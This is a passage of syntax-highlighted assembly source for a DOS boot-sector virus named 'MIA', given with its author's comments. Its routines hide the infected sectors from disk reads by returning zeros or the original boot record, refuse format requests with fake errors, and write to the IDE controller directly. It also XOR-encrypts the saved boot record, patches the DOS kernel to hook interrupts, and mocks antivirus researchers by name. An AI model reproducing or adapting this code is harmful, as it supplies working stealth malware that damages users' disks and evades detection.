 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Controller</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                 
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Rolling_Drive</span><span class="sc0">          </span><span class="sc1">; Wait here until seeking completed</span><span class="sc0">

 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">ch</span><span class="sc0">                     </span><span class="sc1">; 256 words to send</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0F0h</span><span class="sc0">                </span><span class="sc1">; Port 01F0h :</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">outsw</span><span class="sc0">                  </span><span class="sc1">; Sending data to port...</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Controller</span><span class="sc0">             </span><span class="sc1">; Spend some milliseconds</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Falseforce</span><span class="sc0">

</span><span class="sc5">Indirect</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">               
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">18h</span><span class="sc0">                    </span><span class="sc1">; On floppies (or SCSI ?), call disk handler</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Falseforce</span><span class="sc0">

</span><span class="sc5">Trapdoor</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Morbid</span><span class="sc0">


</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒ[ Viral sectors hiding/protection procedure ]ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">


</span><span class="sc5">Denied</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Restorage</span><span class="sc0">              </span><span class="sc1">; Restore INT 15h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0400h</span><span class="sc0">               </span><span class="sc1">; "Sector not found"</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">stc</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Sharpen</span><span class="sc0">

</span><span class="sc5">Streamliner</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">23h</span><span class="sc4">],</span><span class="sc8">ch</span><span class="sc0">       </span><span class="sc1">; Reading MIA's track?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Trapdoor</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">       </span><span class="sc1">; On proper side?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Trapdoor</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                 </span><span class="sc1">; Format function?</span><span class="sc0">

</span><span class="sc5">Silly</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Denied</span><span class="sc0">                 </span><span class="sc1">; Yes, so deny the access</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                  </span><span class="sc1">; Test the drive</span><span class="sc0">
 </span><span class="sc6">jns</span><span class="sc0">    </span><span class="sc5">Denied</span><span class="sc0">                 </span><span class="sc1">; Branch if FD</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Compare CL with sector number of virus codes</span><span class="sc0">
 </span><span class="sc6">jnb</span><span class="sc0">    </span><span class="sc5">Illegal</span><span class="sc0">                </span><span class="sc1">; If same or above, MIA should do some tricks</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; Now CL holds the last sector number that will</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; be read/written</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Trapdoor</span><span class="sc0">               </span><span class="sc1">; If CF=1 then virus codes won't be affected</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; Now AL holds number of sectors allowed being</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; accessed, and CL holds number of sectors MIA</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; prohibits the user to be read/written to</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">18h</span><span class="sc0">                    </span><span class="sc1">; Read/write non-viral sectors</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Retrogress</span><span class="sc0">             </span><span class="sc1">; Error? huh!</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">sal</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">                 </span><span class="sc1">; Convert number of sectors into bytes</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Adjust read/write buffer offset</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                  </span><span class="sc1">; AL now holds the rest of sectors which are  </span><span class="sc0">
                               </span><span class="sc1">; parts of main virus codes</span><span class="sc0">
</span><span class="sc5">Illegal</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">          
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Retrogress</span><span class="sc0">             </span><span class="sc1">; Reading sectors? no, jump out</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
 </span><span class="sc6">shl</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                 </span><span class="sc1">; Convert number of sectors to words</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; Offset of read buffer</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Fill buffer with zeros</span><span class="sc0">
 </span><span class="sc6">repe</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">                  </span><span class="sc1">; So instead of reading MIA's main body, </span><span class="sc0">
                               </span><span class="sc1">; return a block of zeros (faking the user)</span><span class="sc0">
</span><span class="sc5">Retrogress</span><span class="sc4">:</span><span class="sc0"> 
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Restorage</span><span class="sc0">              </span><span class="sc1">; Restore INT 15h vector</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Flop</span><span class="sc0">                   </span><span class="sc1">; Pop all registers</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                  </span><span class="sc1">; Clear AH, indicate successful action</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">                          </span><span class="sc1">; Restore flags state</span><span class="sc0">
 </span><span class="sc6">clc</span><span class="sc0">                           </span><span class="sc1">; Of course, no error ha ha ha...</span><span class="sc0">

</span><span class="sc5">Sharpen</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">retf</span><span class="sc0">   </span><span class="sc2">0002h</span><span class="sc0">                  </span><span class="sc1">; Back to interrupt caller</span><span class="sc0">


                   </span><span class="sc9">SubTtl</span><span class="sc0"> </span><span class="sc5">Ad</span><span class="sc0"> </span><span class="sc5">astra</span><span class="sc0"> </span><span class="sc5">nitamur</span><span class="sc0"> </span><span class="sc5">semper</span><span class="sc0"> </span><span class="sc5">ad</span><span class="sc0"> </span><span class="sc5">optima</span><span class="sc0">


</span><span class="sc5">Falseforce</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; BX = SI = buffer of boot-record</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Get registers from stack</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get read buffer segment from stack</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Bh</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Did he try to harm My MIA?</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Streamliner</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">       </span><span class="sc1">; I'll fight till the cows come home!!</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Streamliner</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">                 </span><span class="sc1">; Formatting disk? huh... 8-(</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Silly</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; One sector</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">22h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; This is where the original boot-record</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; located</span><span class="sc0">

 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                 
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Steal_Sector</span><span class="sc0">           </span><span class="sc1">; Read sector(s) ? branch if yes</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Steal_Sector</span><span class="sc0">           </span><span class="sc1">; Read long sector(s) (HD) ? bomb if yes</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get encryption keyword from boot-launcher</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">ExOr_Boot</span><span class="sc0">              </span><span class="sc1">; Encrypt 512 bytes at ES:[BX]</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                               </span><span class="sc1">; Then write it</span><span class="sc0">
</span><span class="sc5">Steal_Sector</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">                          </span><span class="sc1">; Load original flags state</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">18h</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">StealthShip</span><span class="sc0">            </span><span class="sc1">; Error reading/writing, quit!</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get the keyword again</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">ExOr_Boot</span><span class="sc0">              </span><span class="sc1">; Now decrypt 512 bytes</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc0">                     </span><span class="sc1">; Decrease read/write count</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Generationext</span><span class="sc0">          </span><span class="sc1">; Did he/she try to read/write just one sector?</span><span class="sc0">

 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Bh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Add with bytes per sector</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Bh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get boot track/sector from viral boot-record</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3Dh</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; And head (side) too</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                     </span><span class="sc1">; No problem for MIA</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">18h</span><span class="sc0">                    </span><span class="sc1">; Fetch additional sectors being read</span><span class="sc0">

</span><span class="sc5">Generationext</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">; AL contains number of sectors transferred</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                  </span><span class="sc1">; AH cleared to indicate successful action</span><span class="sc0">

</span><span class="sc5">StealthShip</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Update AX on stack</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Final</span><span class="sc0">

</span><span class="sc5">Controller</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">01F7h</span><span class="sc0">               </span><span class="sc1">; Port 01F7h</span><span class="sc0">

</span><span class="sc5">Trace_drive</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                 </span><span class="sc1">; Still working hey??</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Trace_drive</span><span class="sc0">            </span><span class="sc1">; I'll wait...</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Delay</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Foolish</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0007h</span><span class="sc0">               </span><span class="sc1">; Some millisecond delay...</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0">                      </span><span class="sc1">; Loop here</span><span class="sc0">

</span><span class="sc5">Foolish</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Disable_Equipments</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">in</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Obtain PIC 1 state</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IRQ</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">; Store it for later restorage</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                 </span><span class="sc1">; Mask bit 1 &amp; 2 (keyboard, mouse, RTC, video)</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Share</span><span class="sc0">

</span><span class="sc5">Restore_IRQs</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc0">

</span><span class="sc5">IRQ</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">Share</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">out</span><span class="sc0">    </span><span class="sc2">21h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Restore PIC 1 state</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; Before save the  original  boot-record to disk,  MIA encrypts it.  Although</span><span class="sc0">
</span><span class="sc1">; this will not stop Vesselin "Civet" Bontchev, John McAfee, Frans Veldman or</span><span class="sc0">
</span><span class="sc1">; Eugene Kaspersky from creating decryptor, but this is better than leave the</span><span class="sc0">
</span><span class="sc1">; 512 bytes lie barenaked in disk sector. 8-)</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">ExOr_Boot</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01FFh</span><span class="sc0">

</span><span class="sc5">Disorder</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">add</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; eXclusive OR ES:[BX]</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">Disorder</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; MIA doesn't hook DOS interrupt directly (i.e. change value of doubleword at</span><span class="sc0">
</span><span class="sc1">; 0000h:0084h) but patches two bytes in the DOS kernel with an INT pointed to</span><span class="sc0">
</span><span class="sc1">; viral handler.  MIA uses following subroutine to swap those two bytes (when</span><span class="sc0">
</span><span class="sc1">; executes original DOS interrupt, they must be restored first, otherwise the</span><span class="sc0">
</span><span class="sc1">; computer would screw up!! 8-)</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">Swapper</span><span class="sc4">:</span><span class="sc0">                      
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Viral_Interrupt</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Why doesn't MIA use LODSW instead??</span><span class="sc0">
                               </span><span class="sc1">; Doesn't want to be messed by DF ??</span><span class="sc0">
</span><span class="sc5">ZigAZig</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Interstice</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Exchange with 2 bytes in buffer</span><span class="sc0">
